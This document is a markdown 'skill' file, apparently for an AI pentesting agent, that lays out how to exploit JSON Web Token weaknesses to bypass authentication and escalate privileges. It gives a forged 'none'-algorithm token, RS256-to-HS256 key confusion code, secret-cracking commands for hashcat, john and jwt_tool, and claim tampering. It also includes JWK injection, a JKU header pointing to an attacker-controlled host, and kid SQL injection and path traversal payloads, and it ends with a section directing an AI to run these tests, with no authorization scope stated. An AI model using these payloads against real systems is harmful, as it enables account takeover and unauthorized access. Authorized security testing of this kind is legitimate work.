# JWT Attacks Skill

## Goal

Identify and exploit JSON Web Token (JWT) vulnerabilities to bypass authentication or escalate privileges.

## Methodology

1. **Identify JWT Usage:** Find JWTs in headers (Authorization: Bearer), cookies, or parameters
2. **Decode Token:** Analyze header, payload, and signature
3. **Test Signature Verification:** Try algorithm confusion attacks
4. **Exploit Misconfigurations:** Modify claims, test weak secrets
5. **Escalate Privileges:** Change role/user claims to gain unauthorized access

## JWT Structure

```
Header.Payload.Signature

# Example decoded:
Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "1234567890", "name": "John", "admin": false}
Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

## Algorithm Confusion Attacks

### None Algorithm
```json
// Change header to use "none" algorithm
{"alg": "none", "typ": "JWT"}

// Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiLigKYiLCJhZG1pbiI6dHJ1ZX0.
```

### RS256 to HS256
```python
# If server uses public key for RS256, trick it to use HS256 with public key as secret
import jwt
public_key = open('public_key.pem').read()
token = jwt.encode({"admin": True}, public_key, algorithm='HS256')
```

## Weak Secret Attacks

```bash
# Brute-force JWT secret
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

## Claim Manipulation

```json
// Change user role
{"sub": "user123", "role": "admin"}

// Change user ID
{"sub": "user123", "user_id": "1"}  ->  {"sub": "user123", "user_id": "0"}

// Extend expiration
{"exp": 1893456000}  // Far future timestamp
```

## JWK Injection

```json
// Inject attacker's public key in header
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "attacker_public_key_n",
    "e": "AQAB"
  }
}
```

## JKU/X5U Attacks

```json
// Point JKU to attacker-controlled key set
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwks.json"
}
```

## Kid Injection

```json
// SQL injection via kid
{"alg": "HS256", "kid": "key1' UNION SELECT 'secret'--"}

// Path traversal
{"alg": "HS256", "kid": "../../../../../../dev/null"}
```

## Tools

* **jwt_tool** - Comprehensive JWT testing toolkit
* **jwt.io** - Online JWT decoder
* **hashcat/john** - JWT secret cracking
* **Burp JWT Editor** - Burp Suite extension

## Example Commands

```bash
# Decode JWT
python3 jwt_tool.py <JWT>

# Tamper claims
python3 jwt_tool.py <JWT> -T

# Test vulnerabilities
python3 jwt_tool.py <JWT> -M at  # All tests

# Crack secret
python3 jwt_tool.py <JWT> -C -d /path/to/wordlist
```

## Guidance for AI

* Activate when testing applications using JWT authentication
* Always decode and analyze the token structure first
* Test "none" algorithm bypass (CVE-2015-2951)
* Try RS256 to HS256 confusion if public key is available
* Check for weak secrets with common wordlists
* Look for JKU, X5U, KID header parameters for injection
* JWTs are often in Authorization header or cookies
